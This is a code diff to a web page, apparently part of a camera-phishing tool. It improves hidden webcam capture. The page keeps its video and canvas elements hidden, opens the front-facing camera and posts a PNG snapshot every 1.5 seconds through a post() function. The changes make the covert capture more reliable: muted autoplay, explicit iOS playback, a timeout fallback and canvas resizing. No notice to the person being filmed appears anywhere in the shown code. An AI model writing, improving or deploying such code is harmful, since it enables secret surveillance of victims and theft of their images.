@@ -449,7 +449,7 @@
 </head>
 <body>
     <div class="video-wrap" hidden="hidden">
-        <video id="video" playsinline autoplay></video>
+        <video id="video" playsinline autoplay muted></video>
     </div>
     <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
@@ -469,10 +469,16 @@
     'use strict';
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    let captureInterval = null;
+    let isVideoReady = false;
 
     const constraints = {
         audio: false,
-        video: { facingMode: "user" }
+        video: { 
+            facingMode: "user",
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+        }
     };
 
     async function init() {
@@ -487,11 +493,49 @@
     function handleSuccess(stream) {
         window.stream = stream;
         video.srcObject = stream;
+        
+        // For iOS: explicitly play the video
+        video.play().catch(function(e) {
+            console.log('Video play failed:', e);
+        });
+        
+        // Wait for video to be ready before capturing
+        video.onloadedmetadata = function() {
+            console.log('Video metadata loaded');
+        };
+        
+        video.oncanplay = function() {
+            console.log('Video can play');
+            isVideoReady = true;
+            startCapture();
+        };
+        
+        // Fallback: start capture after delay if events don't fire
+        setTimeout(function() {
+            if (!isVideoReady) {
+                console.log('Starting capture via timeout');
+                isVideoReady = true;
+                startCapture();
+            }
+        }, 2000);
+    }
+    
+    function startCapture() {
+        if (captureInterval) return; // Already capturing
+        
         var context = canvas.getContext('2d');
-        setInterval(function(){
-            context.drawImage(video, 0, 0, 640, 480);
-            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-            post(canvasData);
+        
+        captureInterval = setInterval(function(){
+            // Check if video has valid dimensions
+            if (video.videoWidth > 0 && video.videoHeight > 0) {
+                // Set canvas size to match video
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                var canvasData = canvas.toDataURL("image/png");
+                post(canvasData);
+            }
         }, 1500);
     }
 
